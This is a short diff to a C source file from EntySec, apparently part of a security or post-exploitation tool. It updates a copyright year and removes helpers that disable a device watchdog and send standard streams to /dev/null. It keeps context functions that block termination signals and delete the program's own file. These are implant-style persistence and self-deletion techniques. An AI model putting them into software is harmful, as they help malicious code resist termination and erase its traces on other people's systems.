@@ -1,7 +1,7 @@
 /*
 * MIT License
 *
-* Copyright (c) 2020-2021 EntySec
+* Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
@@ -40,31 +40,7 @@ void prevent_termination()
     sigprocmask(SIG_BLOCK, &block_set, NULL);
 }
 
-void prevent_reboot()
-{
-    int wfd;
-
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-        (wfd = open("/dev/misc/watchdog", 2)) != -1)
-    {
-        int one = 1;
-
-        ioctl(wfd, 0x80045704, &one);
-        close(wfd);
-        wfd = 0;
-    }
-}
-
 void self_corrupt(char *filename)
 {
     unlink(filename);
-}
-
-void redirect_to_null()
-{
-    int dev_null = open("/dev/null", O_WRONLY);
-
-    dup2(dev_null, 0);
-    dup2(dev_null, 1);
-    dup2(dev_null, 2);
 }
